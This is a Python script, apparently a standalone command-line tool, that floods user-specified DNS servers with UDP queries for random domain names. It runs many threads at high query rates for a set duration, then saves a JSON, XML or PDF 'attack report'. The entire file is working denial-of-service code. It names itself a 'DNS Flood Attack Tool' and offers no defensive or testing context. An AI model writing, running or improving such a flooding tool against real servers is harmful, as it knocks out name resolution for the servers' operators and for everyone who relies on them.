#!/usr/bin/env python3
# DNS Flood Attack + Reporting

import argparse
import socket
import random
import struct
import threading
import time
import os
import signal
import sys
import json
import xml.etree.ElementTree as ET
from fpdf import FPDF
from datetime import datetime

# Terminal colors
RED = "\033[38;2;255;0;0m"
RESET = "\033[0m"
BOLD = "\033[1m"

# Global variables
dnsServers = []
attackDuration = 0
queryRate = 0
dnsThreads = 10
dnsRunning = False
startTime = None
packetsSent = 0
failures = []
stopTimer = False
stdoutLock = threading.Lock()
timerThread = None
reportFormat = "json"

def UpdateTimer(startTime):
    global stopTimer, packetsSent
    while not stopTimer:
        elapsed = time.time() - startTime
        elapsedFormatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))
        with stdoutLock:
            sys.stdout.write(f"\rPackets Sent: {BOLD}{packetsSent}{RESET} | Duration: {BOLD}{elapsedFormatted}{RESET}")
            sys.stdout.flush()
        time.sleep(1)
    with stdoutLock:
        sys.stdout.write("\n")
        sys.stdout.flush()

def GenerateRandomDomain():
    letters = "abcdefghijklmnopqrstuvwxyz"
    domain = "".join(random.choice(letters) for _ in range(random.randint(5, 10)))
    return domain + ".com"

def CreateDnsQuery(domain):
    transactionId = random.randint(0, 65535)
    flags = struct.pack(">H", 0x0100)
    numQueries = struct.pack(">H", 1)
    encodedDomain = b""
    for label in domain.split("."):
        encodedDomain += struct.pack(">B", len(label)) + label.encode()
    encodedDomain += b"\x00"
    return (
        struct.pack(">H", transactionId)
        + flags
        + numQueries
        + b"\x00\x00\x00\x00\x00\x00"
        + encodedDomain
        + struct.pack(">H", 1)
        + struct.pack(">H", 1)
    )

def SendDnsQueries():
    global dnsRunning, packetsSent, failures
    endTime = time.time() + attackDuration
    while dnsRunning and time.time() < endTime:
        try:
            targetIp = random.choice(dnsServers)
            domain = GenerateRandomDomain()
            query = CreateDnsQuery(domain)
            sockType = socket.AF_INET6 if ":" in targetIp else socket.AF_INET
            sock = socket.socket(sockType, socket.SOCK_DGRAM)
            sock.sendto(query, (targetIp, 53))
            sock.close()
            packetsSent += 1
            time.sleep(1 / queryRate)
        except Exception as e:
            failures.append(str(e))
            time.sleep(0.001)

def DnsFlood():
    threads = []
    for _ in range(dnsThreads):
        t = threading.Thread(target=SendDnsQueries)
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def GenerateReport():
    now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"dnsflood_report_{now}.{reportFormat.lower()}"
    duration = int(time.time() - startTime)
    reportData = {
        "attack_type": "DNS Flood",
        "dns_servers": dnsServers,
        "query_rate_per_thread": queryRate,
        "threads": dnsThreads,
        "total_packets_sent": packetsSent,
        "duration_seconds": duration,
        "failures": failures,
    }

    if reportFormat == "json":
        with open(filename, "w") as f:
            json.dump(reportData, f, indent=4)
    elif reportFormat == "xml":
        root = ET.Element("DNSFloodReport")
        for key, value in reportData.items():
            child = ET.SubElement(root, key)
            if isinstance(value, list):
                for item in value:
                    ET.SubElement(child, "item").text = str(item)
            else:
                child.text = str(value)
        tree = ET.ElementTree(root)
        tree.write(filename)
    elif reportFormat == "pdf":
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", "B", 14)
        pdf.cell(0, 10, "DNS Flood Attack Report", ln=True)
        pdf.set_font("Arial", size=12)
        for key, value in reportData.items():
            if isinstance(value, list):
                pdf.multi_cell(0, 10, f"{key.capitalize()}:")
                for item in value:
                    pdf.multi_cell(0, 10, f"  - {item}")
            else:
                pdf.cell(0, 10, f"{key.replace('_', ' ').capitalize()}: {value}", ln=True)
        pdf.output(filename)
    print(f"\n{BOLD}Report saved as:{RESET} {filename}")

def Start():
    global dnsRunning, startTime, stopTimer, timerThread, packetsSent
    print(f"\n{RED}Attack Configuration:{RESET}")
    print(f"{RED}- DNS Servers: {RESET}{BOLD}{', '.join(dnsServers)}{RESET}")
    print(f"{RED}- Duration: {RESET}{BOLD}{attackDuration}s{RESET}")
    print(f"{RED}- Threads: {RESET}{BOLD}{dnsThreads}{RESET}")
    print(f"{RED}- Rate: {RESET}{BOLD}{queryRate} qps/thread{RESET}\n")
    print(f"{RED}Starting DNS flood attack...{RESET}\n")
    dnsRunning = True
    packetsSent = 0
    startTime = time.time()
    stopTimer = False
    timerThread = threading.Thread(target=UpdateTimer, args=(startTime,))
    timerThread.start()
    try:
        DnsFlood()
    except KeyboardInterrupt:
        print("\nInterrupted by user!")
    finally:
        dnsRunning = False
        stopTimer = True
        if timerThread.is_alive():
            timerThread.join()
        GenerateReport()

def SignalHandler(sig, frame):
    global dnsRunning, stopTimer
    dnsRunning = False
    stopTimer = True
    print(f"\n{RED}Stopping the attack...{RESET}")
    GenerateReport()
    sys.exit(0)

def terminal():
    global dnsServers, attackDuration, queryRate, reportFormat
    parser = argparse.ArgumentParser(description="DNS Flood Attack Tool")
    parser.add_argument("-d", "--dns", required=True, help="Comma-separated DNS server IPs.")
    parser.add_argument("-t", "--duration", type=int, default=120, help="Duration in seconds.")
    parser.add_argument("-q", "--query_rate", type=int, default=1000, help="Queries per second per thread.")
    parser.add_argument("-r", "--report", choices=["json", "xml", "pdf"], default="json", help="Report format.")
    args = parser.parse_args()
    dnsServers = args.dns.split(",")
    attackDuration = args.duration
    queryRate = args.query_rate
    reportFormat = args.report
    Start()

def menu():
    global dnsServers, attackDuration, queryRate, reportFormat
    dnsServers = input(f"\n{RED}Enter DNS servers (comma-separated): {RESET}").split(",")
    attackDuration = int(input(f"{RED}Attack duration (s): {RESET}"))
    queryRate = int(input(f"{RED}Query rate (per thread): {RESET}"))
    reportFormat = input(f"{RED}Report format (json/xml/pdf): {RESET}").lower()
    Start()

def main():
    signal.signal(signal.SIGINT, SignalHandler)
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()

